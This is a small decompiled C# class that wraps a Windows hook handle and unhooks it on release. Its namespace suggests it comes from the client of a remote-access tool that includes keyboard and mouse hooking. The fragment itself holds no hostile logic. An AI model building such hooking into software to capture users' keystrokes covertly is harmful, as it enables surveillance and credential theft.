using System;
using System.Windows.Forms;
using Microsoft.Win32.SafeHandles;

namespace xClient.Core.MouseKeyHook.WinApi
{
	// Token: 0x02000077 RID: 119
	internal class HookProcedureHandle : SafeHandleZeroOrMinusOneIsInvalid
	{
		// Token: 0x06000326 RID: 806 RVA: 0x000037E8 File Offset: 0x000019E8
		static HookProcedureHandle()
		{
			Application.ApplicationExit += delegate(object sender, EventArgs e)
			{
				HookProcedureHandle._closing = true;
			};
		}

		// Token: 0x06000327 RID: 807 RVA: 0x0000380C File Offset: 0x00001A0C
		public HookProcedureHandle() : base(true)
		{
		}

		// Token: 0x06000328 RID: 808 RVA: 0x00003815 File Offset: 0x00001A15
		protected override bool ReleaseHandle()
		{
			return HookProcedureHandle._closing || HookNativeMethods.UnhookWindowsHookEx(this.handle) != 0;
		}

		// Token: 0x04000144 RID: 324
		private static bool _closing;
	}
}
